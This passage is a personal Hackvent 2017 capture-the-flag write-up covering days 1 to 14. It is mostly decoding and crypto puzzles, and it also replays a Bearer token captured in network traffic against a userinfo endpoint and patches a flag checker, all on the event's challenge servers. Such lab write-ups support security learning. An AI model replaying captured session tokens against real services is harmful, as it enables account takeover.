# Hackvent 2017 write-up

In December 2017, I participated in HackVent run by [Hacking Lab](https://www.hacking-lab.com/index.html).  From December 1st to 24th, a new challenge was released each day.  The first few days started at the "Easy" level and the challenges gradually increased in difficulty as the days went on.  Participants had 24 hours to solve each challenge to receive full points and partial points for later.

I learned so much during this event!  I performed tasks I had never done previously such as:

- PDU SMS decoding
- Reversing CRC32 calculation
- Using modular arithmetic and factoring to get an RSA private key
- Escaping python jails
- Windows PE header formats
- Ethereum virtual machine debugging
- Binary exploitation using ROP gadgets to bypass ASLR
- Blind SQL Injection implementation

Below are the solutions to all challenges including the hidden ones.

# Day 01: 5th anniversary

## Challenge description

Level: Easy

Time to have a look back

![HV17-hv16-hv15-hv14.png](images/HV17-hv16-hv15-hv14.png)

## Solution

The challenge description suggests to look back at challenges from previous years.

A google search returns [previous year writeups on github](https://github.com/shiltemann/CTF-writeups-public).

The flags are the following:

- hv2014: BAAJ-6ZtK-IJHy-bABB-YoMw
- hv2015: Tz9K-4JIJ-EowK-oXP1-NUYL
- hv2016: t8Kd-38aY-QxL5-bn4K-c6Lw

This year's day 01 flag can be found by substituting values for the previous years flags into the corresponding slots.

The flag is: HV17-5YRS-4evr-IJHy-oXP1-c6Lw
# Day 02: Wishlist - The fifth power of two

## Challenge description

Level: Easy

Something happened to my wishlist, please help me.

Provided:

- [Wishlist.txt](provided/Wishlist.txt)

## Solution

A manual examination of the contents suggests that this is base64 encoded:

    $ tail -1 Wishlist.txt 
    Tm5QVDBLCg==

Using the "base64 -d" command, the output can be decoded.  The result is another base64 encoded file.
The challenge description gives a clue "the fifth power of two".  This suggests to repeat this process 32 times.

This can be automated using a bash script:

    $ cat day2.sh
    #!/bin/bash
    
    prev=0
    
    cp Wishlist.txt w0
    
    for i in {1..32}
    do
        cat w$prev | base64 -d > w$i
        rm w$prev
        prev=$i
    done
        
    mv w32 day2_answer.txt
    cat day2_answer.txt

Alternately, a smaller script can be written in Python:

    $ cat day2.py 
    #!/usr/bin/env python

    import base64

    wishlist = open('Wishlist.txt').read().decode('base64')

    for i in xrange(31):
        wishlist = wishlist.decode('base64')

    print wishlist

Run the script and the flag is revealed:

    $ ./day2.sh 
    HV17-Th3F-1fth-Pow3-r0f2-is32

The flag is: HV17-Th3F-1fth-Pow3-r0f2-is32
# Day 03: Strange Logcat Entry - Lost in messages

## Challenge Description

Level: Easy

I found those strange entries in my Android logcat, but I don't know what it's all about... I just want to read my messages!

Provided:

- [logcat.txt](provided/logcat.txt)

## Solution

Search for HV17 or other similar names in the file.  The first line that looks suspicous is:

    $ grep 31733 logcat.txt
    11-13 20:40:24.044  137   137  DEBUG: I 07914400000000F001000B913173317331F300003AC7F79B0C52BEC52190F37D07D1C3EB32888E2E838CECF05907425A63B7161D1D9BB7D2F337BB459E8FD12D188CDD6E85CFE931

Looks interesting, but what is it?  Let's look for the process id:

    $ grep 137 logcat.txt 
    11-13 20:40:13.542   137   137 I DEBUG   :          FAILED TO SEND RAW PDU MESSAGE

A raw pdu message -  what is that? A google search shows this is a SMS format.

Use an [online decoder](https://www.diafaan.com/sms-tutorials/gsm-modem-tutorial/online-sms-pdu-decoder/):

    Text message
    To:     +13371337133
    Message:    Good Job! Now take the Flag: HV17-th1s-isol-dsch-00lm-agic

The flag is: HV17-th1s-isol-dsch-00lm-agic
# Day 04: HoHoHo

## Challenge Description

Level: Medium

NOTE: New easyfied attachment available

Santa has hidden something for you [Here](provided/HoHoHo_medium.pdf)

![HoHoHo_medium.pdf](images/day04_pdf.png) 

Provided:

- [HoHoHo_medium.pdf](provided/HoHoHo_medium.pdf)

## Solution

I spent several hours working on the first harder version.
Once the easified version was released, it took only a couple minutes to solve.

First extract the contents of the PDF with binwalk:

    $ binwalk -e HoHoHo_medium.pdf

Try to determine the file types

    $ file *

Hmm this file looks suspicious:

    7BB7:      Spline Font Database  version 3.0

A little internet searching shows that this is a "sfd" file and can be opened with fontforge.

    $ mv 7BB7 7BB7.sfd
    $ sudo apt install fontforge
    $ fontforge 7BB7

Wow look right there is the flag!
![Day04Flag](images/day04.png)

The flag is: HV17-RP7W-DU6t-Z3qA-jwBz-jItj
# Day 05: Only one hint

## Challenge Description

Level: Medium

Here is your flag:

    0x69355f71
    0xc2c8c11c
    0xdf45873c
    0x9d26aaff
    0xb1b827f4
    0x97d1acf4

and the one and only hint:

    0xFE8F9017 XOR 0x13371337

## Solution

First check the hint using Python:

    In [1]: hex(0xFE8F9017 ^ 0x13371337)
    Out[1]: '0xedb88320'

A google search for this number reveals that this is a [polynomial used by CRC-32](https://en.wikipedia.org/wiki/Cyclic_redundancy_check#Polynomial_representations_of_cyclic_redundancy_checks)

But how do you reverse it? On this [blog](https://blog.affien.com/archives/2005/07/15/reversing-crc/) there is a [python library](http://w-nz.com/~bas/projects/crc-rev-v0.01b.tar).

Download it, and use the crc.patch() function to reverse the CRC:

    In [1]: from crc import Crc32Provider

    In [2]: decoder = Crc32Provider()

    In [3]: flag = [0x69355f71, 0xc2c8c11c, 0xdf45873c, 0x9d26aaff, 0xb1b827f4, 0x97
    ...: d1acf4]

    In [4]: '-'.join([decoder.patch(x) for x in flag])
    Out[4]: 'HV17-7pKs-whyz-o6wF-h4rp-Qlt6'

The flag is: HV17-7pKs-whyz-o6wF-h4rp-Qlt6
# Day 06: Santa's journey


## Challenge Description

Level: Medium

Make sure Santa visits every country.

Follow Santa Claus as he makes his journey around the world.

Provided:

- [Link](http://challenges.hackvent.hacking-lab.com:4200/)

## Solution

We are told to "Make sure Santa visits every country" and given the URL http://challenges.hackvent.hacking-lab.com:4200/

Visiting the website returns a QR code.  And then visiting it again reveals another QR code.

To decode online, use zxing.org.

The link to decode is [https://zxing.org/w/decode?u=http://challenges.hackvent.hacking-lab.com:4200/](https://zxing.org/w/decode?u=http://challenges.hackvent.hacking-lab.com:4200/)

Write a bash loop to get many images:

    for i in {1..300}
    do
        wget https://zxing.org/w/decode?u=http://challenges.hackvent.hacking-lab.com:4200/
        mv decode* result$i
    done

Then look for the flag:

    grep HV17 result*

Gives the result:

    HV17-eCFw-J4xX-buy3-8pzG-kd3M

The flag is: HV17-eCFw-J4xX-buy3-8pzG-kd3M
# Day 07: i know ...

## Description

Level: Medium

We were able to steal a file from santas computer. We are sure, he prepared a gift and there are traces for it in this file.

Please help us to recover it:

Provided:

- [SANTA.FILE](provided/SANTA.FILE)

## Solution

Unzip the file, run strings on it, and grep for "HV17":

    unzip SANTA.FILE && strings SANTA.PRIV | grep "HV17"

Bonus: Also get the ROT13 flag:

    unzip SANTA.FILE && strings SANTA.PRIV | tr 'A-Za-z' 'N-ZA-Mn-za-m' | grep "HV17"

The flag is: HV17-UCyz-0yEU-d90O-vSqS-Sd64
# Day 08: True 1337s ... can read this instantly

## Description:

Level: Medium

I found this obfuscated code on a public FTP-Server. But I don't understand what it's doing...

Provided:

- [True.1337](provided/True.1337)

## Solution

The file that is given is called "True.1337".  It has very long lines, the first 80 characters are:

    $ cat True.1337 | cut -b 1-80
    exec(chr(True+True+True+True+True+True+True+True+True+True)+chr(True+True+True+T
    __1337(_1337(1337+1337+1337+1337+1337+1337+1337+1337+1337+1337)+_1337(1337+1337+

This looks like some obfuscated data, possibly Python.  But what does it mean to add True to something?
Investigating this with a Python interpreter:

    $ python
    >>> True
    True
    >>> True + True
    2
    >>> True + True + True
    3

Very interesting!  I learned something today: "True" evaluates to 1 when using addition in python.

Looking at the first line:

    >>> chr(True+True+True+True+True+True+True+True+True+True)
    '\n'

Change the "exec" to "print" to see the rest of the line:

    $ cp True.1337 True.1337.py 
    $ sed -i s/exec/print/ True.1337.py 
    $ python True.1337.py 

    A=chr;__1337=exec;SANTA=input;FUN=print
    def _1337(B):return A(B//1337)

Now some trial and error, replace __1337 with print

    $ sed -i s/__1337/print/ True.1337.py

And add to the beginning of the file components from the previous section

    A=chr;
    def _1337(B):
        return A(B//1337)

And run again:

    A=chr;__1337=exec;SANTA=input;FUN=print
    def _1337(B):return A(B//1337)

    C=SANTA("?")
    if C=="1787569":FUN(''.join(chr(ord(a) ^ ord(b)) for a,b in zip("{gMZF_M
                                                                        C_X
                                                                           \ERF[X","31415926535897932384626433832")))

It looks like "1787569" is a password!

Try running the original file with python3 and using the password:

    python3 True.1337
    ?1787569
    HV17-th1s-ju5t-l1k3-j5sf-uck!

That's the flag - but let's understand more about how the code works.  Deobfuscate by replacing SANTA and FUN

    C=input("?")
    if C=="1787569":print(''.join(chr(ord(a) ^ ord(b)) for a,b in zip("{gMZF_M
                                                                        C_X
                                                                           \ERF[X","31415926535897932384626433832")))

Using a text editor and xxd, we can isolate the binary portion of the message.
Or do it all on the command line:

    $ grep 1787569 output | sed -e s/.*zip..// | sed -e s/\".*// | xxd -p
    7b670506184d5a07461e5f4d0c43145f03580b195c0745521e465b58130a

Re-writing the code:

    $ cat day08.py
    #!/usr/bin/env python

    import binascii
    encrypted = binascii.unhexlify("7b670506184d5a07461e5f4d0c43145f03580b195c0745521e465b58130a")
    print (''.join(chr(ord(a) ^ ord(b)) for a,b in zip(encrypted, "31415926535897932384626433832")))

So, the flag is encrypted by XOR'ing each character of the plaintext with the ASCII representation of digits of pi.
Neat idea!

    $ ./day08.py 
    HV17-th1s-ju5t-l1k3-j5sf-uck!

This was a fun one to do!

    $ cat day08_thanks.py

    #!/usr/bin/env python

    import binascii
    encrypted = binascii.unhexlify("43484059055701051913415041170d13465b5d14555a57585f565654570a")
    print (''.join(chr(ord(a) ^ ord(b)) for a,b in zip(encrypted, "31415926535897932384626433832")))

    $ ./day08_thanks.py
    pyth0n33, thx 4 the challenge

The flag is: HV17-th1s-ju5t-l1k3-j5sf-uck
# Day 09: JSONion

## Challenge Description

Level: Medium

... is not really an onion. Peel it and find the flag.

Provided:

- [JSONion.zip](provided/JSONion.zip)

## Solution

The file is 1.5 megabytes of JSON.  Inspecting by hand shows that there are a few fields,
but to make sure we did not miss anything, it is good to use some tools.

In my case, I pulled up iPython and started getting more information on the data:

    In [1]: import json

    In [2]: data = json.load(open('jsonion.json'))

    In [3]: type(data)
    Out[3]: list

    In [4]: len(data)
    Out[4]: 1

The first thing to realize is that it is a list with *only one item* in it.
Keep this in the back of our minds while solving (a little foreshadowing).

Take a closer look at the data:

    In [5]: type(data[0])
    Out[5]: dict

    In [6]: for key, value in data[0].iteritems():
        ...:     print key, len(value)
        ...:     
    content 1461121
    mapFrom 73
    mapTo 73
    op 3

The content field is huge!  Let's display the values of the other fields:

    In [7]: for key, value in data[0].iteritems():
        ...:     if key != 'content':
        ...:         print key, value
        ...:     else:
        ...:         print key, 'Length: ', len(value)
        ...:         
        ...:     
    content Length:  1461121
    mapFrom /8ge+uqP5lz:K2Fis"MonJUp\{S6NvmOk]ZI}hLRYXBCW4fD=jT0V[b3xaGQ9yEw,A1cdHrt7
    mapTo [{"op:gzi,cnteH4sIADSTXjNal\/8d9wCByr30Qh+FYPxvqVUOWR7f56Zb21kuJGKmLEM=}]
    op map

It looks like the field "op" stands for "operation" and the other fields describe the mapping.

First create a lookup table (Python dictionary):

    In [8]: mapFrom = data[0]['mapFrom']

    In [9]: mapTo = data[0]['mapTo']

    In [10]: mapping = {}

    In [11]: for i in xrange(len(mapFrom)):
        ...:     mapping[mapFrom[i]] = mapTo[i]

Then convert each character of the contents:

    In [12]: result = ''.join(map(lambda s: mapping[s], data[0]['content']))

    In [13]: result[0:80]
    Out[13]: u'[{"op":"gzip","content":"H4sIAAAAAAAAADScTXejsNal\\/8sd9wCBySr3rDAIjI0IQh+gHgFiBY'

It looks like another JSON string, which is not too much of a surprise given the name of the challenge.

Try using the JSON library to load it:

    In [14]: data2 = json.loads(result)

Create a function to show the keys and values:

    In [15]: def show_keys(data):
        ...:     for entry in data:
        ...:         for key, value in entry.iteritems():
        ...:             if key != 'content':
        ...:                 print key, value
        ...:             else:
        ...:                 print 'len(content)=', len(value)

    In [16]: show_keys(data2)
    len(content)= 1434628
    op gzip

It seems that we have a new operation "gzip".
First looking at the content, it appears that it is base 64 encoded:

    In [17]: data2[0]['content'][-20:]
    Out[17]: u'13/+5/8A1xhq958RFwA='

Use the base64 library to decode it:

    In [18]: import base64

    In [19]: temp = data2[0]['content'].decode('base64')

Decompress the contents using the zlib library.  (Note: the second argument to decompress.  I learned that by searching on stackoverflow)

    In [20]: import zlib

    In [21]: s = zlib.decompress(temp, 16+zlib.MAX_WBITS)

    In [22]: data3 = json.loads(s)

Examine the data:

    In [23]: show_keys(data3)
    len(content)= 1511812
    op b64

And we have yet another operation.  Assuming this occurs repeatedly, it will be more efficient to write a program,
especially now that we have a feeling of how to decode.  I iteratively wrote the program, observing new opcodes
and writing additional handlers for them.

At the end the program looked like this:

    $ cat day09.py
    #!/usr/bin/env python
    
    import base64
    import io
    import json
    import sys
    import zlib
    
    def op_map(data):
        print 'Performing map'
        # Initialize the lookup table
        lookup = {}
    
        # Load the mapping tables
        mapFrom = data['mapFrom']
        mapTo = data['mapTo']
        content = data['content']
    
        for i in xrange(len(mapFrom)):
            lookup[mapFrom[i]] = mapTo[i]
    
        result = ''.join(map(lambda s: lookup[s], content))
    
        return result
    
    def op_b64(data):
        print 'Performing b64'
        content = data['content']
    
        s = content.decode('base64')
    
        return s
    
    def op_gzip(data):
        print 'Performing gzip'
        content = data['content']
    
        out = op_b64(data)
    
        result = zlib.decompress(out, 16+zlib.MAX_WBITS)
    
        return result
    
    def op_nul(data):
        print 'Performing nul'
        content = data['content']
    
        return content
    
    def op_rev(data):
        print 'Performing rev'
        content = data['content']
    
        result = ''.join(reversed(content))
    
        return result
    
    def op_xor(data):
        print 'performing xor'
        content = data['content'].decode('base64')
    
        mask = data['mask'].decode('base64')
    
        result = ''.join(chr(ord(a) ^ ord(mask)) for a in content) 
    
        return result
    
    def op_flag(data):
        print 'Flag found:', data['content']
        return None
    
    def main():
        process_file(open('jsonion.json'))
    
    def process_file(input_str):
        # Load the input file
        data_list = None
    
        if type(input_str) == file:
            data_list = json.load(input_str)
        else:
            data_list = json.loads(input_str)
    
        for i, data in enumerate(data_list):
            op = data['op']
        
            result = None
    
            if op == 'map':
                result = op_map(data)
            elif op == 'b64':
                result = op_b64(data)
            elif op == 'gzip':
                result = op_gzip(data)
            elif op == 'nul':
                result = op_nul(data)
            elif op == 'xor':
                result = op_xor(data)
            elif op == 'rev':
                result = op_rev(data)
            elif op == 'flag':
                result = op_flag(data)
            else:
                print 'Unknown op: %s' % op
    
            if op != 'flag':
                process_file(result)
    
    if __name__ == '__main__':
        main()

Note: all trees are traversed.  The first flag (on the main tree) is fake.
Another path is hidden in the second element of one of the JSON lists.

Executing the program reveals the fake flag and true flag:

    $ ./day09.py 
    Flag found: THIS-ISNO-THEF-LAGR-EALL-Y...
    Flag found: HV17-Ip11-9CaB-JvCf-d5Nq-ffyi

The flag is: HV17-Ip11-9CaB-JvCf-d5Nq-ffyi
# Day 10: Just play the game - Haven't you ever been bored at school?
## Challenge description

Level: Medium

Santa is in trouble. He's elves are busy playing TicTacToe. Beat them and help Sata to save christmas!

Provided: 

- nc challenges.hackvent.hacking-lab.com 1037

## Solution

To access the challenge:

    nc challenges.hackvent.hacking-lab.com 1037

           ---_ ......._-_--.
          (|\ /      / /| \  \
          /  /     .'  -=-'   `.
         /  /    .'             )
       _/  /   .'        _.)   /
      / o   o        _.-' /  .'
      \          _.-'    / .'*|
       \______.-'//    .'.' \*|
        \|  \ | //   .'.' _ |*|
         `   \|//  .'.'_ _ _|*|
          .  .// .'.' | _ _ \*|
          \`-|\_/ /    \ _ _ \*\
           `/'\__/      \ _ _ \*\
          /^|            \ _ _ \*
         '  `             \ _ _ \
                           \_
    Challenge by pyth0n33. Have fun!
    
    I think you know the game from school...Don't you? ;)
    
    Press enter to start the game

Hitting enter shows a familiar tic-tac-toe board:

     ------------- 
     | * | * | * | 
     ------------- 
     ------------- 
     | * | * | * | 
     ------------- 
     ------------- 
     | * | * | * | 
     ------------- 
    Make your move. Type the number of the field you want to set! (1-9)
    
    Field: 

After a couple of plays it appears sometimes the AI makes a mistake and you can win.

For example, 5, 3, 4, 2, 9 frequently ends in a draw.
But, once in a while, 5, 3, 2, 7 wins:

     ------------- 
     | O | O | X | 
     ------------- 
     ------------- 
     | X | X | O | 
     ------------- 
     ------------- 
     | X | * | O | 
     ------------- 
    Congratulations you won! 1/100

It appears that the goal of the challenge is to have 100 consecutive wins.
If you lose, you need to restart back from the beginning.

Through trial and error, one can determine that the moves "3, 9, 7, 6" win everytime.

Write a python script to automate this, using the handy 'telnetlib':

    $ cat day10.py
    #!/usr/bin/env python
    
    import telnetlib
    
    HOST="challenges.hackvent.hacking-lab.com"
    PORT=1037
    
    def main():
        tn = telnetlib.Telnet(HOST, PORT)
    
        # Go past start screen
        print tn.read_until('enter')
        tn.write('\n')
    
        # The combination 3796 wins every time
        for i in xrange(100):
            for choice in [3, 7, 9]:
                print tn.read_until('Field: ')
                tn.write('%d\n' % choice)
    
            tn.write('6\n')
            print tn.read_until('Press enter to start again')
            tn.write('\n')
    
        # Print the flag
        print tn.read_all()
    
        tn.close()
    
    if __name__ == '__main__':
        main()


Run the script, wait for it to win 100 times and claim the flag:

    $ ./day10.py
     ------------- 
     | O | O | X | 
     ------------- 
     ------------- 
     | * | O | X | 
     ------------- 
     ------------- 
     | X | O | X | 
     ------------- 
    Congratulations you won! 100/100
    
    HV17-y0ue-kn0w-7h4t-g4me-sure

The flag is: HV17-y0ue-kn0w-7h4t-g4me-sure
# Day 11: Crypt-o-Math 2.0

## Challenge Description

Level: Hard

You bruteforced last years math lessions? This time you cant escape!

    c = (a * b) % p
    c=0x423EDCDCDCD928DD43EAEEBFE210E694303C695C20F42A27F10284215E90
    p=0xB1FF12FF85A3E45F722B01BF3135ED70A552251030B114B422E390471633
    b=0x88589F79D4129AB83923722E4FB6DD5E20C88FDD283AE5724F6A3697DD97

find "a" to get your flag.

## Solution

This can be done by finding the inverse of b modulo p, and multiplying it by c modulo p.
Modular inverse can be  found using the Extended Euclidean Algorithm.
This can be done in Python, using a [publicly available cryptomath library](https://inventwithpython.com/cryptomath.py)

    $ cat cryptomath.py
    # Cryptomath Module
    # http://inventwithpython.com/hacking (BSD Licensed)
    
    def gcd(a, b):
        # Return the GCD of a and b using Euclid's Algorithm
        while a != 0:
            a, b = b % a, a
        return b
    
    
    def findModInverse(a, m):
        # Returns the modular inverse of a % m, which is
        # the number x such that a*x % m = 1
    
        if gcd(a, m) != 1:
            return None # no mod inverse if a & m aren't relatively prime
    
        # Calculate using the Extended Euclidean Algorithm:
        u1, u2, u3 = 1, 0, a
        v1, v2, v3 = 0, 1, m
        while v3 != 0:
            q = u3 // v3 # // is the integer division operator
            v1, v2, v3, u1, u2, u3 = (u1 - q * v1), (u2 - q * v2), (u3 - q * v3), v1, v2, v3
        return u1 % m

The solution using modular math:

    $ cat day11.py

    #!/usr/bin/env python
    
    import binascii
    import cryptomath
    
    c=0x423EDCDCDCD928DD43EAEEBFE210E694303C695C20F42A27F10284215E90
    p=0xB1FF12FF85A3E45F722B01BF3135ED70A552251030B114B422E390471633
    b=0x88589F79D4129AB83923722E4FB6DD5E20C88FDD283AE5724F6A3697DD97

    # Problem:
    # c = (a * b) % p
    # Find a
    
    def main():
        b_inverse = cryptomath.findModInverse(b, p)
        a = (b_inverse * c) % p
        flag = binascii.unhexlify('%x' % a)
        print flag
    
    if __name__ == '__main__':
        main()

Run the code and get the flag:

    $ ./day11.py
    HV17-XtDw-0DzO-YRgB-2b2e-UWNz

The flag is: HV17-XtDw-0DzO-YRgB-2b2e-UWNz
# Day 12: giftlogistics - countercomplete inmeasure

## Description

Level: Hard

Most passwords of Santa GiftLogistics were stolen. You find an example of the traffic for Santa's account with password and everything. The Elves CSIRT Team detected this and made sure that everyone changed their password.

Unfortunately this was an incomplete countermeasure. It's still possible to retrieve the protected user profile data where you will find the flag.

Provided:

- [Gift logistics wesite](http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/)
- [Network capture](provided/giftlogistics.pcapng)

## Solution

Open up the capture using Wireshark, filter on HTTP traffic and observe the response in tcp.stream 23.

There is an access_token:

```
access_token=eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q&token_type=Bearer
```

To learn more about the token, use an [online JSON Web Token decoder](https://jwt.io/):
```
{
  "sub": "santa",
  "azp": "a75b4722-141d-4c00-b65c-5dc279146b60",
  "iss": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/",
  "exp": 1526936936,
  "iat": 1511384936,
  "jti": "819f5f3d-a7c7-44a9-bb96-0fd82f4b7e75"
}
```

Take a look at the expiration date:
```
$ date -d "@1526936936"
Mon May 21 17:08:56 EDT 2018
```

The access token is still valid!  But where can it be used?

Go back to the Wireshark capture, filter by HTTP traffic and observer the response in tcp.stream 20.  In the list, there is a userinfo endpoint:
```
"userinfo_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo"
```

Use the JSON web token to access the userinfo to get the flag:
```
$ cat day12.sh
#!/bin/sh

JSON_WEB_TOKEN="eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q"
AUTH="Authorization: Bearer $JSON_WEB_TOKEN"
URL="http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo"

curl --header "$AUTH" $URL
$ ./day12.sh 
{"sub":"HV17-eUOF-mPJY-ruga-fUFq-EhOx","name":"Reginald Thumblewood","preferred_username":"santa"}
```

The flag is: HV17-eUOF-mPJY-ruga-fUFq-EhOx
# Day 13: muffin_asm - As M. said, kind of a different architecture!

## Challenge Description

Level: Hard

ohai \o/

How about some custom asm to obsfucate the codez?

Provided:

- [muffin_asm.py](provided/muffin_asm.py)

## Solution

When muffin_asm.py is run, it asks for a flag:
```
$ chmod 755 ./muffin_asm.py
$ ./muffin_asm.py 
[ muffin asm ]
muffinx: Did you ever codez asm?
<< flag_getter v1.0 >>
ohai, gimmeh flag: test
[-] nope!
```

Instrument the cmp function to learn what the program expects for input:
```
def _cmp(r1, r2):
    print 'Received %s, Expected %s' % (chr(r[r1]), chr(r[r2]))
    f[0] = (r[r1] == r[r2])
```

Running the program again shows that the first character is 'H':

```
$ ./muffin_asm.py 
[ muffin asm ]
muffinx: Did you ever codez asm?
<< flag_getter v1.0 >>
ohai, gimmeh flag: test
Received t, Expected H
[-] nope!
```

This can be done repetitively to determine the flag.
But better yet, we can modify the program to simply output the flag!

Add a global variable for flag:

```
flag = ""
```

Update the compare function to store the components of the flag, and always return True:

```
def _cmp(r1, r2):
    global flag
    flag = flag + chr(r[r2])
    f[0] = True
```

Don't even bother with user input:
```
def _rchr(r1): r[r1] = ord('.')
```
Output the flag at the end of the main routine:
```
print flag
```

The modified program:
```
$ cat ./muffin_crack.py
import sys, struct

ip, r, f = 0x00, [0x00]*4, [False]

print 'Cracked by veganjay' #Modified
flag = '' # Modified

def _add(r1, r2): r[r1] = ((r[r1] + r[r2]) & 0xFF)
def _addv(r1, v): r[r1] = ((r[r1] + v) & 0xFF)
def _sub(r1, r2): r[r1] = ((r[r1] - r[r2]) & 0xFF)
def _subv(r1, v): r[r1] = ((r[r1] - v) & 0xFF)
def _xor(r1, r2): r[r1] = (r[r1] ^ r[r2])
def _xorv(r1, v): r[r1] = (r[r1] ^ v)
def _cmp(r1, r2):
    # Modified: was f[0] = (r[r1] == r[r2])
    global flag # Modified
    flag = flag + chr(r[r2]) # Modified
    f[0] = True # Modified
def _cmpv(r1, v): f[0] = (r[r1] == v)
def _je(o): global ip; ip = (o if f[0] else ip)
def _jne(o): global ip; ip = (o if not f[0] else ip)
def _wchr(r1): sys.stdout.write(chr(r[r1]))
def _rchr(r1): r[r1] = ord('.') # Modified: was ord(sys.stdin.read(1))

ins = [_add, _addv, _sub, _subv, _xor, _xorv, _cmp, _cmpv, _je, _jne, _wchr, _rchr]

def run(codez):
    global ip
    while ip < len(codez):
        c_ins = ins[ord(codez[ip])]
        if c_ins in [_je, _jne]:
            old_ip = ip
            c_ins(struct.unpack('<I', codez[(ip+1):(ip+5)])[0])
            if old_ip == ip: ip += 5
            continue
        num_of_args = c_ins.func_code.co_argcount
        if num_of_args == 0: c_ins()
        elif num_of_args == 1: c_ins(ord(codez[ip+1]))
        else: c_ins(ord(codez[ip+1]), ord(codez[ip+2]))
        ip += (1 + num_of_args)
    print flag # Modified
...
```

Run the cracked program to output the flag:
```
$ ./muffin_crack.py 
Cracked by veganjay
[ muffin asm ]
muffinx: Did you ever codez asm?
<< flag_getter v1.0 >>
ohai, gimmeh flag: [+] valid! by muffinx :D if you liked the challenge, troll me @ twitter.com/muffiniks =D
HV17-mUff!n-4sm-!s-cr4zY
```

The flag is: HV17-mUff!n-4sm-!s-cr4zY
# Day 14: Happy Cryptmas

Level: Hard

Today's gift was encrypted with the attached program.  Try to unbox your xmas present.

    Flag: 7A9FDCA5BB061D0D638BE1442586F3488B536399BA05A14FCAE3F0A2E5F268F2F3142D1956769497AE677A12E4D44EC727E255B391005B9ADCF53B4A74FFC34C

Provided:

- [happy_cryptmas.zip](provided/happy_cryptmas.zip)

## Solution

First extract the file and determine what type it is:

```
$ unzip happy_cryptmas.zip 
Archive:  happy_cryptmas.zip
  inflating: hackvent                
$ file hackvent
hackvent: Mach-O 64-bit x86_64 executable
```

Use Hopper to disassemble and generate pseudo-code.
![pseudo-code](images/day14_pseudocode.png).


Looking at the function calls, it uses the [The GNU Multiple Precision Arithmetic Library ](https://gmplib.org/)
The documentation for the function [powm](https://gmplib.org/manual/Integer-Exponentiation.html#Integer-Exponentiation) describes
the parameter.  In summary, the encryption function does the following:

```
result = (input ** 65537) % 0xF66EB887F2B8A620FD03C7D0633791CB4804739CE7FE001C81E6E02783737CA21DB2A0D8AF2D10B200006D10737A0872C667AD142F90407132EFABF8E5D6BD51
```

This looks like RSA encryption/decryption.
Uh, oh!  we need to factor a huge number, which I thought was *hard*.
And the number here seems big.  Looking closer at it, it is 155 digits in base 10 and has 512 bits.
Hmm, it is actually not the big.

Looking at [wikipedia](https://en.wikipedia.org/wiki/RSA_Factoring_Challenge), there is a [RSA-155](https://en.wikipedia.org/wiki/RSA_numbers#RSA-155),
which was factored in 1999.  But unfortunately, it is not the same number as in the challenge.

Use an [online integer factorization calculator](https://www.alpertron.com.ar/ECM.HTM) to determine the factors:

![factors](images/day14_factor.png)

The factors are:

```
p = 18132985757038135691
q = 711781150511215724435363874088486910075853913118425049972912826148221297483065007967192431613422409694054064755658564243721555532535827
```

Write a small python program to calculate the decryption key and output the flag:
```
#!/usr/bin/env python

# Cryptomath library is available from here: https://inventwithpython.com/cryptomath.py

import binascii
import cryptomath

# The cipher text provided in the challenge description
cipher_text = 0x7A9FDCA5BB061D0D638BE1442586F3488B536399BA05A14FCAE3F0A2E5F268F2F3142D1956769497AE677A12E4D44EC727E255B391005B9ADCF53B4A74FFC34C

# Modulus reverse engineered from the hackvent executable
n = 0xF66EB887F2B8A620FD03C7D0633791CB4804739CE7FE001C81E6E02783737CA21DB2A0D8AF2D10B200006D10737A0872C667AD142F90407132EFABF8E5D6BD51

# The encryption key reverse engineered form the hackvent executable
e = 65537

# Use https://www.alpertron.com.ar/ECM.HTM to factor n into p and q
p = 18132985757038135691
q = 711781150511215724435363874088486910075853913118425049972912826148221297483065007967192431613422409694054064755658564243721555532535827

# Check that we have the proper factors
assert(n == p * q)

